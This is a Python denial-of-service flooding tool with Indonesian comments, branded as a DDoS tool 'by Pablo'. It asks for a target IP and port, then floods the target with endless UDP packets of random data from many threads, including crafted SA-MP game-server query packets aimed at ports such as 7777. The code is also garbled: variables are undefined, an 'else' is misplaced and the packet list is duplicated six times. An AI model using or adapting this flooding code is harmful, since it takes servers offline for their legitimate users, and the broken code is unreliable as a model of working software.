import socket
import struct
import codecs,sys
import threading
import random
import time
import os


for i in range(3):
    pwd = input(" Password : ")
    j = 3
    if (pwd == author):
        time.sleep(2)
        print("Turn On System")
        time.sleep(.3)
        break
    else:
        time.sleep(.4)
        print("[x] AWOKAWOK SALAH \n")
        continue
time.sleep(.5)
print("\033[35m Succesfull Logins To Server")
time.sleep(.6)

os.system("clear")
print("\u001b[35m WELCOME TO TOOLS DDOS BY PABLO")
print("\u001b[35m PERINGATAN[!] JANGAN MENGGUNAKAN TOOLS INI SEBAGAI ABUSE DDOS")

print("╔══════════════════════════════════╗")
print("║ Example How To Attack!           ║")
print("║ 1. Masukan Host/IP               ║")
print("║ 2. Masukan Port 80/3389/443!     ║")
print("║ 3. Enter Dan Tools Berkerja!     ║")
print("║ #Tools Remake By Pablo           ║")
print("╚══════════════════════════════════╝")

print("\033[31m━━━ Host/IP Nya Diisi Dulu Ya Syg")
ip = str(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Port Nya Diisi Ya Syg")
port = int(input("┗━>\033[0m:"))
time.sleep(1)

Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("021efd40","hex_codec"),#cookie port 1111 
                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
                       ]
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
                       ] 
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
                       ]
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
                       ]
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
                       ] 
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
                       ]


def run(): 
     data = random._urandom(1000) 
     i = random.choice(("[*]","[!]","[#]")) 
     while True: 
         try: 
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
             s.connect((orgip,port)) 
             s.send(data) 
             for x in range(times):
                 s.send(data) 
             print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
         except socket.error: 
             s.close() 
             print("[!] PABLO BERHASIL MENEMBUS PERTAHANAN SERVER")
            
def run2(): 
     data = random._urandom(1100) 
     i = random.choice(("[*]","[!]","[#]")) 
     while True: 
         try: 
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
             s.connect((orgip,port)) 
             s.send(data) 
             for x in range(times): 
                 s.send(data) 
             print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
         except socket.error: 
             s.close() 
             print("[!] PABLO BERHASIL MENEMBUS PERTAHANAN SERVER")

def run3(): 
     data = random._urandom(1200) 
     i = random.choice(("[*]","[!]","[#]")) 
     while True: 
         try: 
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
             s.connect((orgip,port)) 
             s.send(data) 
             for x in range(times): 
                 s.send(data) 
             print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
         except socket.error: 
             s.close() 
             print("[!] PABLO BERHASIL MENEMBUS PERTAHANAN SERVER")

def run4(): 
     data = random._urandom(1300) 
     i = random.choice(("[*]","[!]","[#]")) 
     while True: 
         try: 
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
             s.connect((orgip,port)) 
             s.send(data) 
             for x in range(times): 
                 s.send(data) 
             print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
         except socket.error: 
             s.close() 
             print("[!] PABLO BERHASIL MENEMBUS PERTAHANAN SERVER")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
    th = threading.Thread(target = run2)
    th.start()
  else:
    th = threading.Thread(target = run3)
    th.start()
    th = threading.Thread(target = run4)
    th.start()





class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP
                
                msg = Pacotes[random.randrange(0,3)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                elif(int(port) == 1111):
                    sock.sendto(Pacotes[9], (ip, int(port)))    
                
author = "Pablo"

if __name__ == '__main__':
    try:
     for x in range(100):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
#REMAKE BY PABLO
#APAPUN YANG ANDA LAKUKAN ANDA HARUS BERTANGGUNG JAWAB
#GUNAKAN LAH SEPERLUNYA
#JANGAN MENGGUNAKAN NYA UNTUK ABUSE DDOS SERVER TANPA ADA NYA REASON
#MARI MEMBANTAI OTAK DONATE
#UNTUK BISA MENDAPATKAN PASSWORD ANDA BISA MENJELAJAH SCRIPT INI KLO ANDA PAHAM
#KLO ANDA TIDAK MEMAHAMI DIMANA PASSWORD NYA BERADA BISA MENGHUBUNGI NOMER SAYA 
#GUNAKAN LAH TOOLS INI DENGAN BIJAK

#APA ITU DDOS?
#Serangan distributed denial-of-service (DDoS) menargetkan situs web dan server dengan mengganggu layanan jaringan.

#APA ITU DOS?
#Dalam komputasi, sebuah serangan denial-of-service (serangan DoS) adalah serangan dunia maya di mana pelaku berupaya membuat mesin atau sumber daya jaringan tidak tersedia bagi pengguna yang dituju dengan mengganggu layanan host yang terhubung ke Internet untuk sementara atau tanpa batas. Denial of service biasanya dicapai dengan membanjiri mesin atau sumber daya yang ditargetkan dengan permintaan yang berlebihan dalam upaya untuk membebani sistem dan mencegah beberapa atau semua permintaan yang sah agar tidak terpenuhi.
